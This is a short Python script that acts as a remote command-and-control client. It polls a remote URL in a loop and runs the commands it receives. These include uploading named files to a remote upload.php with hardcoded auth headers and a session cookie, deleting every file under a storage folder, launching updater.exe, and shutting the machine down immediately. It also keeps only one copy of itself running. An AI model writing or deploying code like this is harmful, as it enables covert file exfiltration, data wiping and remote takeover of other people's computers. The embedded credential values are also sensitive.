import sys
import requests
import time
import os
import shutil
import psutil

count = 0
for i in psutil.pids():
    try:
        if psutil.Process(i).name() == 'command_response.exe':
            count += 1
    except:
        pass
if count > 1:
    sys.exit()

header = {
    'Authorization': '1677034306556',
    'Connection': 'keep-alive',
    'Cookie': 'SHIROJSESSIONID=75ace860-0f00-4db0-9440-6c6d53cdf101',
    'Host': 'aceproj.gtcsst.org.cn',
    'Origin': 'https://aceproj.gtcsst.org.cn',
    'Referer': 'http://aceproj.gtcsst.org.cn/666/upload_file.php',
    'User-Agent': 'GTC Software Studio - ACE_Project (priority:00A) && contre_project (sub of ACE_Project)'
}

with open('url.txt', 'r') as f:
    req_url = f.readlines()[0]

with open('storage.txt', 'r') as f:
    storage_path = f.readlines()[0]


while True:
    try:
        r = requests.post(req_url + 'overall.php', data={'VALIDATE': 'GTC contre project'})
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        continue
    command = r.text.split('\n')
    print(command)
    for one in command:
        if len(one) == 0:
            continue
        if one[0] == 'r':
            os.system('start updater.exe')
        elif one[0] == 'c':
            dirs = os.listdir(storage_path)
            for item in dirs:
                if os.path.isfile(os.path.join(storage_path, item)):
                    os.remove(os.path.join(storage_path, item))
                else:
                    shutil.rmtree(os.path.join(storage_path, item), ignore_errors=True)
        elif one[0] == 'u':
            target_path = one[7:]
            try:
                temp_file = open(os.path.join(storage_path, target_path), 'rb')
                file_object = {
                    'type': (None, '6', None),
                    'orgType': (None, 'B', None),
                    'file': (target_path.split('\\')[-1], temp_file, 'unknown')
                }
            except FileNotFoundError as err:
                with open('6.txt', 'w') as f:
                    f.write('File not found')
                temp_file = open('6.txt', 'rb')
                file_object = {
                    'type': (None, '6', None),
                    'orgType': (None, 'B', None),
                    'file': ('ERROR %d.txt' % int(time.time()), temp_file, 'unknown')
                }
            except:
                continue
            requests.post(req_url + 'upload.php', headers=header, files=file_object)
            time.sleep(1)
            temp_file.close()
        elif one[0] == 's':
            os.system('shutdown -s -t 0')
    time.sleep(5)
